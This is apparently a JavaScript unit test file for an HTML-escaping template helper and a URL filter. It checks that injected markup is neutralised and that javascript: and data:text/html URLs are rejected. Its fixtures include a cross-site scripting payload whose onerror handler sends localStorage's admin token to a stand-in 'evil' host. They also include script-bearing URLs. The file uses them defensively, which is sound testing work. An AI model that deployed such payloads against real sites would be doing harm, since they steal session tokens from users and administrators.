import { test } from "node:test";
import assert from "node:assert/strict";
import { escapeHtml, html, safeUrl } from "./html.mjs";

const attack = `<img src=x onerror="fetch('//evil?'+localStorage['admin-token'])">`;

test("every interpolated value is escaped", () => {
  const out = String(html`<p>${attack}</p>`);
  assert.ok(!out.includes("<img"), out);
  assert.ok(out.includes("&lt;img src=x onerror=&quot;"));
});

test("nested html`` fragments and arrays render as markup, their values still escaped", () => {
  const rows = [["Name", attack], ["Email", "a@b.c"]];
  const out = String(html`<table>${rows.map(([k, v]) => html`<tr><th>${k}</th><td>${v}</td></tr>`)}</table>`);
  assert.equal((out.match(/<tr>/g) || []).length, 2);
  assert.ok(!out.includes("<img"));
});

test("plain strings that look like HTML are NOT trusted (no raw escape hatch)", () => {
  const fragment = "<br />";
  assert.equal(String(html`${fragment}`), "&lt;br /&gt;");
});

test("null/undefined/false render as empty; numbers render as text", () => {
  assert.equal(String(html`${null}${undefined}${false}${0}`), "0");
});

test("safeUrl only allows http(s) and data:image URLs", () => {
  assert.equal(safeUrl("javascript:alert(1)"), "");
  assert.equal(safeUrl(" JAVASCRIPT:alert(1)"), "");
  assert.equal(safeUrl("data:text/html;base64,PHNjcmlwdD4="), "");
  assert.equal(safeUrl("https://example.com/a.jpg"), "https://example.com/a.jpg");
  assert.equal(safeUrl("data:image/png;base64,AAAA"), "data:image/png;base64,AAAA");
});

test("escapeHtml covers quotes for attribute contexts", () => {
  assert.equal(escapeHtml(`"'<>&`), "&quot;&#039;&lt;&gt;&amp;");
});
